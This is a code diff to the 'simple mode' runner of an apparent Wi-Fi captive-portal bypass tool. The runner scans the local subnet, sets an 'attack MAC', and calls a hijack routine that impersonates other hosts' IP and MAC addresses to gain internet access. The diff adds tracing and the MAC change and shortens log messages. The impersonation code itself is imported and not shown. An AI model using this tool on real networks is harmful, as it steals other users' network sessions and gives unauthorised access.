@@ -8,11 +8,13 @@ import time
 
 from cafe_chameleon.utils.signals import register_signal_handler, restore_and_exit, ScanSkipInterrupt, HijackSkipInterrupt
 from cafe_chameleon.utils.state import set_restore_params
+from cafe_chameleon.utils.tracing import trace
 from cafe_chameleon.ui.console import log_scan, log_main, log_plus, log_warning
 from cafe_chameleon.ui.prompts import ask_proceed, ask_restore
 from cafe_chameleon.network.internet import has_internet
 from cafe_chameleon.network.sysfs import wait_for_carrier
 from cafe_chameleon.network.hijack import hijack, restore
+from cafe_chameleon.network.mac import get_attack_mac, set_mac_address
 from cafe_chameleon.scanners.detector import auto_detect_network_params, get_interface_details
 from cafe_chameleon.scanners.arp_scanner import scan_subnet
 from cafe_chameleon.scanners.orchestrator import deep_scan_subnet
@@ -23,6 +25,7 @@ def run_simple(args, quiet_header: bool = False) -> bool:
     register_signal_handler()
 
     interface = getattr(args, "interface", None) or "wlan0"
+    trace(f"[FEATURE] Initializing Simple mode execution on interface {interface}")
     wait_for_carrier(interface, timeout=5.0)
     auto_params = auto_detect_network_params(target_iface=interface)
     local_ip, local_mac = get_interface_details(interface)
@@ -43,7 +46,7 @@ def run_simple(args, quiet_header: bool = False) -> bool:
         log_scan("[-] Could not auto-detect target network subnet CIDR.")
         sys.exit(1)
 
-    log_scan(f"=== SUBNET SCANNER ({target_str}) ===", clear=True)
+    log_scan(f"========================================\n  SUBNET SCANNER ({target_str})\n========================================", clear=True)
 
     try:
         network = ipaddress.ip_network(target_str, strict=False)
@@ -53,7 +56,7 @@ def run_simple(args, quiet_header: bool = False) -> bool:
 
     if network.prefixlen < 24:
         subnets = list(network.subnets(new_prefix=24))
-        log_scan(f"Large target subnet ({network}): Split into {len(subnets)} /24 blocks.")
+        log_scan(f"Subnet {network} split into {len(subnets)} /24 blocks.")
     else:
         subnets = [network]
 
@@ -66,21 +69,26 @@ def run_simple(args, quiet_header: bool = False) -> bool:
     profile = getattr(args, "profile", None)
     set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore, profile=profile)
 
+    # Apply attack MAC address before running host discovery/takeover
+    attack_mac = get_attack_mac(interface)
+    trace(f"[FEATURE] Applying attack MAC {attack_mac} on {interface} for simple mode scan")
+    set_mac_address(interface, attack_mac, profile=profile)
+
     # Initial internet check
     if auto_params.get("internet_access"):
         if not getattr(args, "force", False):
-            log_scan("[+] Internet access is already active on current connection!")
-            log_main("[+] Internet access is already active on current connection!")
+            log_scan("[+] Internet online.")
+            log_main("[+] Internet online.")
             return True
         else:
-            log_scan("[!] Internet access is active, but --force is enabled. Continuing scan...")
-            log_main("[!] Internet access is active, but --force is enabled. Continuing scan...")
+            log_scan("[!] Internet online (--force enabled). Continuing scan...")
+            log_main("[!] Internet online (--force enabled). Continuing scan...")
 
     discovered_devices = []
     try:
         for sub in subnets:
             try:
-                log_scan(f"\n--- Scanning Subnet Block {sub} ---", clear=True)
+                log_scan(f"\n── Scanning Subnet Block {sub} ──", clear=True)
                 if is_deep:
                     hosts = deep_scan_subnet(sub, interface, gateway_ip=gw_ip, gateway_mac=gw_mac, local_ip=local_ip, local_mac=local_mac, duration=30)
                 else:
@@ -97,7 +105,7 @@ def run_simple(args, quiet_header: bool = False) -> bool:
                         unique_hosts.append(h)
 
                 if unique_hosts:
-                    log_scan(f"[+] Discovered {len(unique_hosts)} active host(s) on block {sub}:")
+                    log_scan(f"[+] Found {len(unique_hosts)} active host(s) on block {sub}:")
                     for host in unique_hosts:
                         tag = ""
                         if gw_ip and host["ip"] == gw_ip:
@@ -117,30 +125,30 @@ def run_simple(args, quiet_header: bool = False) -> bool:
                                 hijack_success = hijack(interface, host['ip'], host['mac'], netmask, broadcast, gw_ip, profile=profile, bssid=auto_params.get("gateway_mac"))
                                 if hijack_success:
                                     log_scan("[+] SUCCESS! Internet access established!")
-                                    log_main(f"\033[92m[+] SUCCESS! Internet access established via {host['ip']} ({host['mac']})!\033[0m")
+                                    log_main(f"\033[92m[+] SUCCESS! Internet active via {host['ip']} ({host['mac']})!\033[0m")
                                     if not getattr(args, "force", False):
                                         return True
 
                                 if getattr(args, "force", False):
                                     if not ask_proceed():
-                                        log_warning("User requested to stop attack after impersonation.")
-                                        log_scan("[-] User requested to stop attack after impersonation.")
+                                        log_warning("Stopped after impersonation.")
+                                        log_scan("[-] Stopped after impersonation.")
                                         has_acc = hijack_success or has_internet()
                                         if ask_restore(default_restore=not has_acc):
                                             restore(interface, local_mac, ipmask, broadcast, gw_ip)
                                         else:
-                                            log_plus("Keeping current MAC and network configuration.")
+                                            log_plus("Keeping current network config.")
                                         return has_acc
 
                                 time.sleep(0.5)
                         except HijackSkipInterrupt:
-                            log_scan(f"\033[93m[-] Ctrl+C in Impersonation Engine! Skipping target host {host['ip']}...\033[0m")
+                            log_scan(f"\033[93m[-] Skipping host {host['ip']} (Ctrl+C)...\033[0m")
                             continue
                 else:
-                    log_scan(f"[Info] No active user hosts found on block {sub}.")
+                    log_scan(f"[i] No active user hosts found on block {sub}.")
             except ScanSkipInterrupt:
-                log_scan(f"\033[93m[-] Ctrl+C in Subnet Scanner! Skipping subnet block {sub} & stopping impersonations...\033[0m")
-                log_main(f"\033[93m[-] Skipping subnet block {sub} (Ctrl+C in Subnet Scanner)...\033[0m")
+                log_scan(f"\033[93m[-] Skipping subnet block {sub} (Ctrl+C)...\033[0m")
+                log_main(f"\033[93m[-] Skipping subnet block {sub} (Ctrl+C)...\033[0m")
                 continue
 
     except KeyboardInterrupt:
@@ -149,6 +157,7 @@ def run_simple(args, quiet_header: bool = False) -> bool:
         restore_and_exit("Ctrl+C received during scan.")
 
     log_scan(f"\n[+] Scan complete. Total Discovered Hosts: {len(discovered_devices)}")
+
     has_acc = has_internet()
     if getattr(args, "force", False):
         if ask_restore(default_restore=not has_acc):
